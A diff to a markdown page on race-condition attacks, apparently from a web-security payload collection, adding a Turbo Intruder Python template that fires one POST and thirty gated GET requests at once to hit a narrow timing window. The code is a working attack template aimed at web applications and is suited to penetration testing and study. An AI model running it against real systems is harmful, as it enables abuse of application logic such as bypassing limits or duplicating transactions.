@@ -4,9 +4,12 @@
 
 ## Summary
 
-* [Tools](#tools)
-* [Turbo Intruder Examples](#turbo-intruder-examples)
-* [References](#references)
+- [Race Condition](#race-condition)
+  - [Summary](#summary)
+  - [Tools](#tools)
+  - [Turbo Intruder Examples](#turbo-intruder-examples)
+  - [Turbo Intruder 2 Requests Examples](#turbo-intruder-2-requests-examples)
+  - [References](#references)
 
 ## Tools
 
@@ -41,6 +44,37 @@
 3. Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder
 4. Click "Attack"
 
+## Turbo Intruder 2 Requests Examples
+This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.
+```python
+def queueRequests(target, wordlists): 
+    engine = RequestEngine(endpoint=target.endpoint, 
+                           concurrentConnections=30, 
+                           requestsPerConnection=100, 
+                           pipeline=False 
+                           ) 
+    request1 = '''
+POST /target-URI-1 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+
+parameterName=parameterValue
+    ''' 
+
+    request2 = '''
+GET /target-URI-2 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+    '''
+
+    engine.queue(request1, gate='race1')
+    for i in range(30): 
+        engine.queue(request2, gate='race1') 
+    engine.openGate('race1') 
+    engine.complete(timeout=60) 
+def handleResponse(req, interesting): 
+    table.add(req)
+```
 
 ## References
 
